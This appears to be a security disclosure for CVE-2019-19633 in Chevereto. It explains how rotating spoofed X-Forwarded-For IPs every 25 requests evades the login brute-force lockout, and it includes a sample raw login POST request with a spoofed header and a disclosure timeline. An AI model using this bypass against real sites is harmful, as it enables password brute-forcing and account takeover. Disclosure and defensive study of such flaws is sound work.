# CVE-2019-19633
lib/G/functions.php in Chevereto 1.0.0 through 1.1.4 Free, and through 3.13.5 Core, allows an attacker to perform bruteforce attacks without triggering the implemented protection mechanism by manipulating the X-Forwarded-For header in the request. The IP in the header has to be changed every 25th request (default 25) to avoid activating the protection and blocking the IP (not that it matters).

# First 25 requests
X-Forwarded-For: **8.8.8.1, 8.8.8.2**

# Second wave of 25 requests
X-Forwarded-For: **8.8.8.2, 8.8.8.3**

And so on...

```
POST /login HTTP/1.1
Host: 192.168.0.88
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 85
Origin: http://192.168.0.88
DNT: 1
Connection: close
Referer: http://192.168.0.88/login
X-Forwarded-For: 8.8.8.228, 8.8.8.88
Cookie: PHPSESSID=16dal7t7fmdbd86ahjkp8qo43a
Upgrade-Insecure-Requests: 1

login-subject=admin&password=test&auth_token=fb22558fc0f068d3cfb9ca98b413c8d0adbbc205
```

# Timeline (90 day default disclosure)
- 2019-12-07 - Reported finding to vendor
- 2019-12-07 - Vendor responded
- 2020-03-07 - Deadline
